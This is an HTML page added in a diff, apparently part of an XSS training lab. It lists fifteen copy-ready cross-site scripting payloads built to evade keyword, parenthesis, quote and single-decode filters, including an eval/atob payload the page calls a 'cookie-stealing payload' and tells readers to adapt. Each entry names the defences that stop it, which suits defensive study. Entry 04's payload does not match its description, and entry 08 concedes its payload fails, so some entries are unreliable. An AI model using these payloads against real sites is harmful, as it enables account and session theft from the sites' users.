@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Bank 06 — Filter Evasion &amp; Obfuscation</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:36px 32px;max-width:900px}
+  h1{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
+  .sub{font-size:12px;color:var(--muted);margin-bottom:32px}
+  .entry{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}
+  .entry-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .entry-num{font-size:11px;font-weight:700;color:var(--muted);background:#060d1a;padding:3px 10px;border-radius:10px}
+  .tags{display:flex;flex-wrap:wrap;gap:5px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px}
+  .t-technique{background:#1a1500;color:var(--warn)}
+  .t-bypass{background:#2a0000;color:var(--danger)}
+  .t-encoding{background:#001a1a;color:var(--ok)}
+  .payload-block{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);margin:10px 0;position:relative;white-space:pre-wrap;word-break:break-all}
+  .copy-btn{position:absolute;top:8px;right:8px;font-size:10px;padding:3px 10px;background:#1e3a5f;color:var(--accent);border:1px solid var(--accent);border-radius:3px;cursor:pointer}
+  .meta{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12px;margin-top:10px}
+  .meta-key{color:var(--muted);font-weight:700;white-space:nowrap}
+  .meta-val{color:var(--text)}
+  .meta-val code{font-family:'Courier New',monospace;font-size:11px;background:#060d1a;color:var(--accent);padding:1px 5px;border-radius:3px}
+  .stopped{color:var(--ok)}
+  .bypasses{color:var(--danger)}
+  .nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  .nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .section-label{font-size:13px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+  a{color:var(--accent)}
+  .callout{border-left:3px solid var(--warn);background:#1a1500;padding:10px 14px;border-radius:0 4px 4px 0;font-size:12px;color:var(--muted);margin:12px 0}
+  .callout strong{color:var(--text)}
+</style>
+</head>
+<body>
+
+<h1>06 — Filter Evasion &amp; Obfuscation</h1>
+<div class="sub">15 payloads · Module reference: M12 · Lab endpoint: <code>http://localhost:5000/waf-sim?q=PAYLOAD</code> and <code>/filter/blocklist?q=PAYLOAD</code></div>
+
+<div class="callout">
+  <strong>The fundamental lesson of this page:</strong> String-based and pattern-matching defenses are unwinnable.
+  The HTML/JS specification is larger and more permissive than any blocklist.
+  Each payload here demonstrates a specific gap in a specific type of filter.
+  The correct defense is output encoding — not filtering.
+</div>
+
+<div class="section-label">A. HTML Encoding Tricks</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">HTML ENTITY</span><span class="tag t-bypass">KEYWORD FILTER</span></div>
+    <span class="entry-num">01</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">HTML decimal entity encoding of the JS function name</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching the literal string "alert" in the attribute value</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">HTML-entity decoding before keyword matching; output encoding; CSP</span>
+    <span class="meta-key">Note</span><span class="meta-val"><code>&amp;#97;</code>=a, <code>&amp;#108;</code>=l, <code>&amp;#101;</code>=e, <code>&amp;#114;</code>=r, <code>&amp;#116;</code>=t. Browser decodes entities inside attribute values before executing the handler.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">HTML ENTITY HEX</span><span class="tag t-bypass">KEYWORD FILTER</span></div>
+    <span class="entry-num">02</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">HTML hex entity encoding (<code>&amp;#x61;</code>=a)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters checking decimal entities but not hex; filters checking for "alert" literally</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Entity-aware filters; output encoding; CSP</span>
+    <span class="meta-key">Note</span><span class="meta-val">Combines with case variations and mixed decimal/hex entities for additional evasion permutations.</span>
+  </div>
+</div>
+
+<div class="section-label">B. JavaScript-Level Obfuscation</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">JS STRING CONCAT</span><span class="tag t-bypass">KEYWORD FILTER</span></div>
+    <span class="entry-num">03</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="window['al'+'ert'](1)"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">String concatenation to construct the function name at runtime</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters blocking the literal word "alert" in the attribute value</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; output encoding; Trusted Types; dynamic analysis (must execute to detect)</span>
+    <span class="meta-key">Note</span><span class="meta-val">The browser evaluates <code>'al'+'ert'</code> at runtime = <code>'alert'</code>. <code>window['alert']</code> calls window.alert. Static filters see neither "alert" nor "window.alert".</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">JS UNICODE</span><span class="tag t-bypass">KEYWORD FILTER</span></div>
+    <span class="entry-num">04</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="alert(1)"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">JS Unicode escape sequences in identifier names</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching "alert" literally; static analysis that doesn't resolve Unicode escapes</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; Unicode-normalising filters; output encoding</span>
+    <span class="meta-key">Note</span><span class="meta-val">JS identifiers allow <code>\uXXXX</code> escapes. The engine resolves them before execution. <code>alert</code> = "alert". Works in any JS context — event handlers, script tags, eval.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">JS CHAR CODE</span><span class="tag t-bypass">KEYWORD FILTER</span></div>
+    <span class="entry-num">05</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">Reconstruct payload string from char codes at runtime</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters for "alert", "eval", parentheses — combined with other tricks each can be individually obscured</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP without unsafe-eval; output encoding; Trusted Types</span>
+    <span class="meta-key">Note</span><span class="meta-val"><code>String.fromCharCode(97,108,101,114,116,40,49,41)</code> = <code>"alert(1)"</code>. eval executes it. Char codes can themselves be further obfuscated with arithmetic: <code>97</code> → <code>0x61</code> → <code>48+49</code>.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">TEMPLATE LITERAL</span><span class="tag t-bypass">PAREN FILTER</span></div>
+    <span class="entry-num">06</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror=alert`document.domain`&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">Tagged template literal — calls alert with no parentheses</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters blocking <code>(</code> and <code>)</code> characters; anti-paren WAF rules</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; output encoding; filters that also block backtick</span>
+    <span class="meta-key">Note</span><span class="meta-val"><code>alert\`1\`</code> is equivalent to <code>alert(["1"])</code>. alert coerces to string. No parentheses needed. Passes WAF rules requiring open/close parens for function calls.</span>
+  </div>
+</div>
+
+<div class="section-label">C. Tag Attribute Whitespace &amp; Comment Tricks</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">WHITESPACE</span><span class="tag t-bypass">KEYWORD FILTER</span></div>
+    <span class="entry-num">07</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x
+     onerror
+     =
+     alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">Newlines and spaces between attribute name, equals sign, and value</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching <code>onerror=</code> as a single token; regex that doesn't account for whitespace between name and value</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOM-level parsing; output encoding; CSP</span>
+    <span class="meta-key">Note</span><span class="meta-val">HTML allows arbitrary whitespace (including newlines, tabs) between attribute name, =, and value. Browsers normalise this. Regex patterns must use <code>\s*=\s*</code> not just <code>=</code>.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">JS COMMENT</span><span class="tag t-bypass">KEYWORD FILTER</span></div>
+    <span class="entry-num">08</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="al/**/ert(1)"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">JS block comment inserted in the middle of the function name</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching "alert" literally — the word is split</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">JS comment-stripping before keyword check; CSP; output encoding</span>
+    <span class="meta-key">Note</span><span class="meta-val"><code>al/**/ert</code> — in JavaScript, <code>/* */</code> comments are whitespace and cannot appear inside an identifier. This does NOT actually work as a JS identifier bypass. However, some WAFs naively strip comments first creating their own bypass. Use with care when testing WAF logic specifically.</span>
+  </div>
+</div>
+
+<div class="section-label">D. Null Bytes &amp; Special Characters</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">NULL BYTE</span><span class="tag t-bypass">C-STYLE FILTER</span></div>
+    <span class="entry-num">09</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;scri%00pt&gt;alert(1)&lt;/scri%00pt&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">Null byte (%00) inside tag name</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">C-string-based filters that stop at null byte (the filter sees "scri", browser ignores null and sees "script")</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Modern browsers largely ignore null bytes in tag names too; this works in specific legacy environments. Null byte stripping before filtering; output encoding</span>
+    <span class="meta-key">Note</span><span class="meta-val">Classic C-string truncation bypass. In languages where strings are null-terminated (older PHP, C), the filter stops at %00. The browser's HTML tokeniser ignores the null byte and reads the full tag name. Effective against PHP 4/5-era WAFs.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">DOUBLE ENCODING</span><span class="tag t-bypass">SINGLE-DECODE FILTER</span></div>
+    <span class="entry-num">10</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+%253Cscript%253Ealert(1)%253C%252Fscript%253E</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">Double URL-encoding: <code>%25</code>=<code>%</code>, so <code>%253C</code> decodes first to <code>%3C</code>, then to <code>&lt;</code></span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Servers/WAFs that URL-decode once then pass to the app; app decodes again</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Normalising to fully decoded form before any check; rejecting double-encoded input; output encoding</span>
+    <span class="meta-key">Note</span><span class="meta-val">Works when the WAF decodes once (sees <code>%3Cscript%3E</code> — might pass), then the app decodes again (sees <code>&lt;script&gt;</code>). The check and the execution model different decode depths.</span>
+  </div>
+</div>
+
+<div class="section-label">E. Splitting Across Boundaries</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">STRING SPLIT</span><span class="tag t-bypass">SAMY TECHNIQUE</span></div>
+    <span class="entry-num">11</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="java
+script:alert(1)"&gt;
+/* Note: newline inside javascript: — some older browsers skip whitespace in URI schemes */</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">Literal newline inside the keyword "javascript" to split it across two lines</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching "javascript" as a single-line string; the Samy worm used exactly this to bypass MySpace's "javascript" keyword filter</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Normalising whitespace before keyword matching; output encoding; CSP</span>
+    <span class="meta-key">Note</span><span class="meta-val">The Samy worm used <code>java\nscript</code> split across a CSS <code>background</code> property. Some browsers (IE of the era) accepted the split scheme. Modern browsers are more strict, but the technique demonstrates that newlines must be stripped before scheme matching.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">JSFUCK</span><span class="tag t-bypass">KEYWORD FILTER</span></div>
+    <span class="entry-num">12</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// JSFuck — alert(1) with only []()!+ characters:
+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]
+[([]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+!+[]]+...]
+// (abbreviated — full JSFuck output is ~2000 chars)
+
+// Shorter demo: +[] === 0, ![] === false, !![] === true
+// JSFuck encodes any JS using only 6 characters: [ ] ( ) ! +</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">JSFuck: encode any JavaScript using only <code>[]()!+</code></span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Virtually all keyword-based filters — no letters, no digits, no standard function names appear in the payload</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP without unsafe-eval (JSFuck relies on eval internally); structural analysis; character-level input limits</span>
+    <span class="meta-key">Origin</span><span class="meta-val">JSFuck by Martin Kleppe. Every JS value and string can be constructed from type coercions of [] and !. The resulting payload contains zero recognisable keywords. Demonstrates that keyword filters are structurally unwinnable.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">BASE64 PAYLOAD</span><span class="tag t-bypass">CONTENT SCAN</span></div>
+    <span class="entry-num">13</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror=eval(atob`YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">Base64-encoded payload decoded at runtime via atob, executed via eval + backtick (no parens for atob)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters scanning for "cookie", "document", "alert" — none appear in the payload string</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP without unsafe-eval; output encoding; Trusted Types</span>
+    <span class="meta-key">Note</span><span class="meta-val">The base64 decodes to <code>alert(document.cookie)</code>. atob is called with template literal (no parens). Combined with eval, this is a complete keyword-free cookie-stealing payload. Change the base64 for any payload.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">MUTATION</span><span class="tag t-bypass">RECURSIVE FILTER</span></div>
+    <span class="entry-num">14</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x one&lt;/p&gt;rror=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">Broken tag inside attribute name — parser closes the broken &lt;/p&gt; and reconstructs attribute</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters checking the pre-parse string for "onerror" — the string contains "one&lt;/p&gt;rror" not "onerror"</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOM-based sanitizers that parse as the browser would; output encoding; CSP</span>
+    <span class="meta-key">Note</span><span class="meta-val">Browser error recovery: the parser encounters &lt;/p&gt; inside an attribute (malformed), closes it, and continues parsing the img tag. The attribute name "onerror" is assembled from fragments across the recovery. Filter sees neither "onerror" nor a &lt;script&gt;.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-technique">BACKTICK ATTR</span><span class="tag t-bypass">QUOTE FILTER</span></div>
+    <span class="entry-num">15</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=`x` onerror=`alert(1)`&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Technique</span><span class="meta-val">Backtick as attribute value delimiter (IE/older browsers)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters that only escape <code>"</code> and <code>'</code> when building HTML attributes — backtick is left unescaped</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Modern browsers (Chrome/Firefox) treat backtick as part of unquoted attribute value, not delimiter. Works in IE. Sanitizers should also escape backtick in attribute contexts.</span>
+    <span class="meta-key">Origin</span><span class="meta-val">IE6/7 accepted backtick as attribute quote character. Code that escapes <code>"</code> and <code>'</code> but not <code>\`</code> leaves this open in IE. Still relevant for legacy-targeting payloads and demonstrates that quote character allowlists must be exhaustive.</span>
+  </div>
+</div>
+
+<div class="nav">
+  <a href="05_dom_sinks.html">← 05: DOM Sinks</a>
+  <a href="../payload_bank.html">Index</a>
+  <a href="07_mxss.html">07: Mutation XSS →</a>
+</div>
+
+<script>
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => { btn.textContent = 'copied!'; setTimeout(() => btn.textContent = 'copy', 1500); });
+});
+</script>
+</body>
+</html>
